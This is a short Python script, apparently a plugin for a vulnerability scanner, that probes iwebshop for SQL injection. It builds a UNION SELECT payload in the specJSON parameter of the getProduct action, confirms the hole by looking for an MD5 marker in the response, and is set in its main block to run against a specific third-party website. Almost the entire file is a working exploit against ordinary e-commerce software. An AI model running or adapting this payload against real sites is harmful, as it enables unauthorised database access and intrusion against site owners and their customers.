#!/usr/bin/env python
#-*- coding:utf-8 -*-
#Author:judger
#SerType:iwebshop SQL-Injection
def assign(service, arg):
    if service == "iwebshop":
        return True, arg

def audit(arg):
    payload = '''index.php?controller=site&action=getProduct&specJSON={"judger":"1'%20and%201=0%20union%20select%20md5(1),2,3,4,5,6,7,8,9%20and%20'1'%20=%20'1"}'''
    url = arg + payload
    code, head, body, errcode, _url = curl.curl2(url)
    if code == 200 and 'c4ca4238a0b923820dcc509a6f75849b' in body:
        security_hole('SQL-Injection:' + url)

    
if __name__ == '__main__':
    from dummy import *
    audit(assign('iwebshop', 'http://www.eastcang.com/')[1])